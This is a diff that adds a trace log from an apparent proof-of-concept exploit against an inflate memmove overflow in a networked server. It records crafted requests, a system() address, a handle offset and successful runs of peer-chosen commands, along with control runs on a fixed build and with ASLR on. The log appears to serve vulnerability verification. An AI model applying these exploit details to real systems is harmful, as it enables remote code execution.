@@ -1,0 +1,74 @@
+== capture pre-memmove image (ASLR off) ==
+HEADER_BYTES=10
+394	    memmove(state->in, strm->next_in, strm->avail_in);
+$1 = 0x47be9
+SNAPSHOT_BYTES=293865
+SERVER_RC=0
+SNAPSHOT_BYTES=293865
+== vulnerable + snapshot, id>a ==
+SNAPSHOT=snapshot.bin LEN=293865
+CRAFT_SRC=358975 HANDLE_OFF=96 SYSTEM_ADDR=0x7ffff7c58750 DELTA=293440 CMD=id>a
+MARKER=1 MARKER_BODY=b'uid=1000(mesh-home) gid=1000(mesh-home) groups=1000(mesh-home),4(adm),24(cdrom),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(lxd),112(docker),988(ollama),996(input)\n'
+REQ_BYTES=359400
+WRITTEN=65535
+PRINTF_RC=-5
+UV_SENT=1
+UV_RAN=1
+SERVER_DONE=1
+SERVER_RC=0
+vuln-id-a MARKER=1 MARKER_BODY=b'uid=1000(mesh-home) gid=1000(mesh-home) groups=1000(mesh-home),4(adm),24(cdrom),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(lxd),112(docker),988(ollama),996(input)\n'
+== vulnerable + snapshot, id>b (peer-chosen command) ==
+SNAPSHOT=snapshot.bin LEN=293865
+CRAFT_SRC=358975 HANDLE_OFF=96 SYSTEM_ADDR=0x7ffff7c58750 DELTA=293440 CMD=id>b
+MARKER=1 MARKER_BODY=b'uid=1000(mesh-home) gid=1000(mesh-home) groups=1000(mesh-home),4(adm),24(cdrom),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(lxd),112(docker),988(ollama),996(input)\n'
+REQ_BYTES=359400
+WRITTEN=65535
+PRINTF_RC=-5
+UV_SENT=1
+UV_RAN=1
+SERVER_DONE=1
+SERVER_RC=0
+vuln-id-b MARKER=1 MARKER_BODY=b'uid=1000(mesh-home) gid=1000(mesh-home) groups=1000(mesh-home),4(adm),24(cdrom),27(sudo),29(audio),30(dip),44(video),46(plugdev),101(lxd),112(docker),988(ollama),996(input)\n'
+== fixed + snapshot ==
+SNAPSHOT=snapshot.bin LEN=293865
+CRAFT_SRC=358975 HANDLE_OFF=96 SYSTEM_ADDR=0x7ffff7c58750 DELTA=293440 CMD=id>a
+MARKER=0 MARKER_BODY=b''
+REQ_BYTES=359400
+WRITTEN=65535
+PRINTF_RC=1
+UV_SENT=1
+UV_RAN=1
+SERVER_DONE=1
+SERVER_RC=0
+fixed-id-a MARKER=0 MARKER_BODY=b''
+== vulnerable + snapshot, original callback kept ==
+SNAPSHOT=snapshot.bin LEN=293865
+CRAFT_SRC=358975 HANDLE_OFF=96 SYSTEM_ADDR=0x7ffff7c58750 DELTA=293440 CMD=id>a
+MARKER=0 MARKER_BODY=b''
+REQ_BYTES=359400
+WRITTEN=65535
+PRINTF_RC=-5
+UV_SENT=1
+UV_RAN=1
+SERVER_DONE=1
+SERVER_RC=0
+keep-cb MARKER=0 MARKER_BODY=b''
+== vulnerable + snapshot, ASLR on (stale libc pointers) ==
+SNAPSHOT=snapshot.bin LEN=293865
+MARKER=0 MARKER_BODY=b''
+REQ_BYTES=359400
+WRITTEN=65535
+PRINTF_RC=-5
+SERVER_RC=-11
+aslr-on MARKER=0 MARKER_BODY=b''
+== vulnerable + draining peer (no overflow) ==
+MARKER=0 MARKER_BODY=b''
+REQ_BYTES=359400
+WRITTEN=359400
+PRINTF_RC=1
+UV_SENT=1
+UV_RAN=1
+SERVER_DONE=1
+SERVER_RC=0
+safe-drain MARKER=0 MARKER_BODY=b''
+1d0b5122c8f45d6f5a1acdab8da6d4a90c00609c2ae28912e8e9461a3abb8611  trace.txt
